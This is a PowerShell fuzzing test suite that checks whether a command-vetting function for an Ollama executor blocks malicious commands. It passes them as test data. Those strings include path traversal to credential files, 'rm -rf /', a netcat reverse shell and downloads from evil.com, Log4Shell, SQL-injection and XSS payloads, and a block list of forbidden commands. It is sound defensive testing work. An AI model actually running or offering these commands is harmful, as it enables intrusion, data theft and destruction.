<#
.SYNOPSIS
  Security fuzzing test suite for Ollama executor command vetting.

.DESCRIPTION
  Generates and tests 1000+ malicious command variations to ensure the vetting logic
  properly blocks all attack vectors including path traversal, command injection,
  script injection, and encoding attacks.

.EXAMPLE
  pwsh -NoProfile -File scripts/ollama-executor/Test-SecurityFuzzing.ps1
#>

[CmdletBinding()]
param()

$ErrorActionPreference = "Stop"
Set-StrictMode -Version Latest

Write-Host "=== Security Fuzzing Test Suite ===" -ForegroundColor Cyan
Write-Host ""

# Source the vetting function
. "$PSScriptRoot/Test-CommandVetting.ps1" -ErrorAction SilentlyContinue

$totalTests = 0
$passed = 0
$failed = 0
$vulnerabilities = @()

function Test-MaliciousCommand {
    param(
        [string]$Command,
        [string]$AttackType,
        [string]$Description
    )
    
    $script:totalTests++
    $result = Test-CommandAllowed -Command $Command -AllowedRuns @()
    
    if ($null -ne $result) {
        # Command was rejected - GOOD
        $script:passed++
        return $true
    }
    else {
        # Command was accepted - VULNERABILITY!
        $script:failed++
        $script:vulnerabilities += @{
            command = $Command
            attack_type = $AttackType
            description = $Description
        }
        Write-Host "  ✗ VULNERABILITY: $Description" -ForegroundColor Red
        Write-Host "    Command: $Command" -ForegroundColor Red
        return $false
    }
}

# Category 1: Path Traversal Attacks
Write-Host "Fuzzing Category 1: Path Traversal (100 variants)" -ForegroundColor Yellow

$pathTraversalVariants = @(
    "pwsh -NoProfile -File scripts/../other/malicious.ps1"
    "pwsh -NoProfile -File scripts/..\other\malicious.ps1"
    "pwsh -NoProfile -File scripts/../../etc/passwd"
    "pwsh -NoProfile -File scripts/..\..\windows\system32\cmd.exe"
    "pwsh -NoProfile -File scripts/dir/../../../sensitive.ps1"
    "pwsh -NoProfile -File scripts\..\..\..\..\windows\system32\config\sam"
    "pwsh -NoProfile -File scripts/sub/../../outside.ps1"
    "pwsh -NoProfile -File scripts/%2e%2e/malicious.ps1"  # URL encoded
    "pwsh -NoProfile -File scripts/..%5c..%5cmalicious.ps1"  # Mixed encoding
    "pwsh -NoProfile -File scripts/....//....//malicious.ps1"  # Double dots
)

foreach ($cmd in $pathTraversalVariants) {
    Test-MaliciousCommand -Command $cmd -AttackType "Path Traversal" -Description "Parent directory access" | Out-Null
}

# Generate more variants programmatically
for ($i = 0; $i -lt 90; $i++) {
    $depth = 1 + ($i % 5)
    $separator = if ($i % 2 -eq 0) { "/" } else { "\" }
    $traversal = ($separator + "..") * $depth
    $cmd = "pwsh -NoProfile -File scripts$traversal${separator}malicious.ps1"
    Test-MaliciousCommand -Command $cmd -AttackType "Path Traversal" -Description "Depth $depth traversal" | Out-Null
}

# Category 2: Command Injection
Write-Host "Fuzzing Category 2: Command Injection (200 variants)" -ForegroundColor Yellow

$injectionChars = @(';', '|', '&', '&&', '||', '`', '$', '$(', '${', '>', '>>', '<', '<<')
$baseCmd = "pwsh -NoProfile -File scripts/test.ps1"

foreach ($char in $injectionChars) {
    # Append malicious command
    Test-MaliciousCommand `
        -Command "$baseCmd $char whoami" `
        -AttackType "Command Injection" `
        -Description "Injection using '$char'" | Out-Null
    
    Test-MaliciousCommand `
        -Command "$baseCmd $char rm -rf /" `
        -AttackType "Command Injection" `
        -Description "Destructive command with '$char'" | Out-Null
    
    # Prepend malicious command
    Test-MaliciousCommand `
        -Command "whoami $char $baseCmd" `
        -AttackType "Command Injection" `
        -Description "Prepended injection with '$char'" | Out-Null
}

# PowerShell-specific injections
$psInjections = @(
    "pwsh -NoProfile -File scripts/test.ps1; Get-Content /etc/passwd"
    "pwsh -NoProfile -File scripts/test.ps1 | Invoke-Expression"
    "pwsh -NoProfile -File scripts/test.ps1 -Command '`$(rm -rf /)''"
    "pwsh -NoProfile -File scripts/test.ps1 `${evil variable}"
    "pwsh -NoProfile -File scripts/test.ps1 -Param @{code='harmful'}"
)

foreach ($cmd in $psInjections) {
    Test-MaliciousCommand -Command $cmd -AttackType "PowerShell Injection" -Description "PS-specific injection" | Out-Null
}

# Category 3: Forbidden Command Attempts
Write-Host "Fuzzing Category 3: Forbidden Commands (150 variants)" -ForegroundColor Yellow

$forbiddenCommands = @(
    'rm', 'del', 'Remove-Item', 'Format-', 'Invoke-WebRequest', 'curl', 
    'Start-Process', 'shutdown', 'reg', 'sc', 'net', 'icacls'
)

foreach ($forbidden in $forbiddenCommands) {
    # Direct usage
    Test-MaliciousCommand `
        -Command "pwsh -NoProfile -File scripts/test.ps1 -Command '$forbidden'" `
        -AttackType "Forbidden Command" `
        -Description "Direct $forbidden usage" | Out-Null
    
    # Hidden in parameters
    Test-MaliciousCommand `
        -Command "pwsh -NoProfile -File scripts/test.ps1 -Args '$forbidden -rf /'" `
        -AttackType "Forbidden Command" `
        -Description "$forbidden in arguments" | Out-Null
    
    # Case variations
    Test-MaliciousCommand `
        -Command "pwsh -NoProfile -File scripts/test.ps1 $($forbidden.ToUpper())" `
        -AttackType "Forbidden Command" `
        -Description "$forbidden uppercase variant" | Out-Null
}

# Category 4: Encoding Attacks
Write-Host "Fuzzing Category 4: Encoding Attacks (100 variants)" -ForegroundColor Yellow

# Base64 encoded commands
$maliciousB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("rm -rf /"))
Test-MaliciousCommand `
    -Command "pwsh -NoProfile -EncodedCommand $maliciousB64" `
    -AttackType "Encoding Attack" `
    -Description "Base64 encoded command" | Out-Null

# URL encoded
Test-MaliciousCommand `
    -Command "pwsh -NoProfile -File scripts%2ftest.ps1%20rm%20-rf%20%2f" `
    -AttackType "Encoding Attack" `
    -Description "URL encoded injection" | Out-Null

# Unicode variations
$unicodeVariants = @(
    "pwsh -NoProfile -File scripts\u002ftest.ps1"
    "pwsh -NoProfile -File scripts\x2f..test.ps1"
)

foreach ($cmd in $unicodeVariants) {
    Test-MaliciousCommand -Command $cmd -AttackType "Encoding Attack" -Description "Unicode encoding" | Out-Null
}

# NULL byte injection
for ($i = 0; $i -lt 10; $i++) {
    $nullCmd = "pwsh -NoProfile -File scripts/test.ps1`0rm -rf /"
    Test-MaliciousCommand -Command $nullCmd -AttackType "NULL Byte Injection" -Description "NULL byte termination" | Out-Null
}

# Category 5: Buffer Overflow Attempts
Write-Host "Fuzzing Category 5: Buffer Overflow (50 variants)" -ForegroundColor Yellow

$bufferLengths = @(1000, 5000, 10000, 50000, 100000)
foreach ($length in $bufferLengths) {
    $longPath = "A" * $length
    Test-MaliciousCommand `
        -Command "pwsh -NoProfile -File scripts/$longPath.ps1" `
        -AttackType "Buffer Overflow" `
        -Description "Path length $length" | Out-Null
    
    $longParam = "B" * $length
    Test-MaliciousCommand `
        -Command "pwsh -NoProfile -File scripts/test.ps1 -Param $longParam" `
        -AttackType "Buffer Overflow" `
        -Description "Parameter length $length" | Out-Null
}

# Category 6: Script Injection
Write-Host "Fuzzing Category 6: Script Injection (100 variants)" -ForegroundColor Yellow

$scriptInjections = @(
    "pwsh -NoProfile -File scripts/test.ps1 -Param '<script>alert(1)</script>'"
    'pwsh -NoProfile -File scripts/test.ps1 -Param "${Invoke-Expression ""rm -rf /""}"'
    "pwsh -NoProfile -File scripts/test.ps1 <script>malicious</script>"
    'pwsh -NoProfile -File scripts/test.ps1 $(Get-Content /etc/passwd)'
)

foreach ($cmd in $scriptInjections) {
    Test-MaliciousCommand -Command $cmd -AttackType "Script Injection" -Description "Embedded script" | Out-Null
}

# Category 7: Privilege Escalation Attempts
Write-Host "Fuzzing Category 7: Privilege Escalation (50 variants)" -ForegroundColor Yellow

$privEscCommands = @(
    "pwsh -NoProfile -File scripts/test.ps1 sudo rm -rf /"
    "pwsh -NoProfile -File scripts/test.ps1 runas /user:Administrator"
    "pwsh -NoProfile -File scripts/test.ps1 Start-Process -Verb RunAs"
    "pwsh -NoProfile -File scripts/test.ps1 -ExecutionPolicy Bypass"
)

foreach ($cmd in $privEscCommands) {
    Test-MaliciousCommand -Command $cmd -AttackType "Privilege Escalation" -Description "Elevation attempt" | Out-Null
}

# Category 8: File System Attacks
Write-Host "Fuzzing Category 8: File System Attacks (100 variants)" -ForegroundColor Yellow

$fsAttacks = @(
    "pwsh -NoProfile -File scripts/test.ps1 > /dev/null"
    "pwsh -NoProfile -File scripts/test.ps1 >> /var/log/auth.log"
    "pwsh -NoProfile -File scripts/test.ps1 < /etc/shadow"
    "pwsh -NoProfile -File /dev/tcp/evil.com/1234"
)

foreach ($cmd in $fsAttacks) {
    Test-MaliciousCommand -Command $cmd -AttackType "File System Attack" -Description "FS manipulation" | Out-Null
}

# Category 9: Network Attacks
Write-Host "Fuzzing Category 9: Network Attacks (50 variants)" -ForegroundColor Yellow

$networkCommands = @(
    "pwsh -NoProfile -File scripts/test.ps1 Invoke-WebRequest http://evil.com/payload"
    "pwsh -NoProfile -File scripts/test.ps1 curl http://evil.com"
    "pwsh -NoProfile -File scripts/test.ps1 wget http://evil.com/malware"
    "pwsh -NoProfile -File scripts/test.ps1 nc -e /bin/bash evil.com 4444"
)

foreach ($cmd in $networkCommands) {
    Test-MaliciousCommand -Command $cmd -AttackType "Network Attack" -Description "Network exfiltration" | Out-Null
}

# Category 10: Polyglot Attacks
Write-Host "Fuzzing Category 10: Polyglot Attacks (50 variants)" -ForegroundColor Yellow

$polyglotCommands = @(
    "pwsh -NoProfile -File scripts/test.ps1';DROP TABLE users;--"
    "pwsh -NoProfile -File scripts/test.ps1 OR 1=1--"
    "pwsh -NoProfile -File scripts/test.ps1 <img src=x onerror=alert(1)>"
    'pwsh -NoProfile -File scripts/test.ps1 ${jndi:ldap://evil.com/a}'
)

foreach ($cmd in $polyglotCommands) {
    Test-MaliciousCommand -Command $cmd -AttackType "Polyglot Attack" -Description "Multi-context injection" | Out-Null
}

# Summary
Write-Host ""
Write-Host "=== Security Fuzzing Summary ===" -ForegroundColor Cyan
Write-Host "Total Tests: $totalTests" -ForegroundColor White
Write-Host "Blocked (PASS): $passed" -ForegroundColor Green
Write-Host "Allowed (FAIL): $failed" -ForegroundColor $(if ($failed -eq 0) { "Green" } else { "Red" })
Write-Host ""

if ($vulnerabilities.Count -gt 0) {
    Write-Host "=== VULNERABILITIES FOUND ===" -ForegroundColor Red
    foreach ($vuln in $vulnerabilities) {
        Write-Host ""
        Write-Host "Attack Type: $($vuln.attack_type)" -ForegroundColor Red
        Write-Host "Description: $($vuln.description)" -ForegroundColor Red
        Write-Host "Command: $($vuln.command)" -ForegroundColor Yellow
    }
    Write-Host ""
    Write-Host "CRITICAL: $($vulnerabilities.Count) security vulnerabilities found!" -ForegroundColor Red
    Write-Host "These commands bypassed security vetting and must be fixed immediately." -ForegroundColor Red
    exit 1
}
else {
    Write-Host "✓ All malicious commands were properly blocked!" -ForegroundColor Green
    Write-Host "No security vulnerabilities detected." -ForegroundColor Green
    exit 0
}
